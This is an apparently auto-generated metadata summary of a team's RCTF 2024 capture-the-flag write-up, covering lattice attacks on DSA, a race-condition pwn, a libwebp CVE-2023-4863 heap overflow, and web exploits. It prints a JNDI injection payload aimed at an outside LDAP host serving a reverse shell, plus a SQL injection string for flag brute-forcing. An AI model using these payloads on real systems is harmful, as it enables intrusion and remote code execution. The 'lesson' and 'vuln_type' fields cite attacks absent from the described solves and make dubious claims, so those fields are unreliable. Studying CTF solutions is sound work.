---
title: RCTF 2024 Writeup - Polaris 战队
contest: RCTF 2024
year: 2024
difficulty: high
vuln_type: rop
tags: [rsa, dsa, lwe-hnp, lattice, bkz, rsa-lll, race-condition, pwn-multi-thread, sandbox-bypass, webp-cve-2023-4863, sql-regexp, ldap-jndi]
attack_chain:
  - Crypto SignSystem: 19 次 DSA 签名 + BKZ block_size=30 找短向量恢复私钥
  - 每签 (r,s) = ((g^k mod p) mod q, (H+x*r)/k mod q)
  - 构造格 A=[tt*R[i]*s0*inv(tt*r0*S[i],q) mod q] B=[...] Ge 矩阵 + q 对角 + 1 K
  - 高 152 bit + 低 bit 穷举 256*4=1024 找 d → 验签 "get flag"
  - Crypto Hello,XCTF!: 64 字符 X/C/T/F 字符串满足 b2l(f"{hello}$") % p == b2l(b"hello")
  - 选字符 X(88)/f(102)/t(116) 转化为 -1/0/1 背包问题 LLL
  - BKZ block_size=30 + 100000 次试 p 还原 hello
  - PWN 五一国际劳动节: 多线程菜单 + rapids 1秒 sleep vs Magic Castle 无延迟 race
  - 整数溢出 money → 触发 MagicCastle SwitchHandle → SwitchHandle(1337) 调 system
  - dwebp 题: CVE-2023-4863 libwebp 堆溢出 + mistymntncop craft.c PoC
  - 反馈菜单 add(0x43a0)+edit(0x20)+delete+add(0x10) 触发 unsorted bin
  - 上传 base64 RIFF 触发 dwebp 解析 + 堆溢出泄 libc
  - Web openYourEyesToSeeTheWorld: Spring LDAP search JNDI 注入
  - {"ip":"x.x.x.x","port":1389,"searchBase":"JacksonReverseShell/","filter":"jasper"}
  - c_lookup → LdapCtx → c_processJunction_nns → 远程反序列化
  - Web what_is_love: love_key SQL 注入 jasper' || love_key REGEXP '^R'#
  - 倒序逐字符爆破 64 字符 flag
  - 验签 userInfo.username==my_lover.username (默认 lover) + love_time=NaN
  - parseInt("non-numeric") = NaN 绕过
  - Misc 五一国际劳动节 logo: 2024 ASCII art 答 flag
key_payload: Ge.BKZ(block_size=30) 找 k0 + d = (k0*s0-h0)*inv(r0,q) % q + sign(pub, d, "get flag", k0)
one_liner: RCTF 2024 多题大杂烩：Crypto DSA 私钥恢复 BKZ + RSA LLL 64字符 XCTF 背包 + PWN 多线程 race condition + dwebp CVE-2023-4863 + Web LDAP/JNDI + love_key SQL 注入。
lesson: DSA 19 次签名 + 高 8 bit 未知可用 LLL/BKZ 短向量恢复私钥；XOR 多重签名恢复私钥是 DSA 经典攻击；Jinja SSTI shebang 注入是文件上传 + webshell 经典套路；parseInt("") = NaN 是 JS 环境变量绕过。
quality: high
---
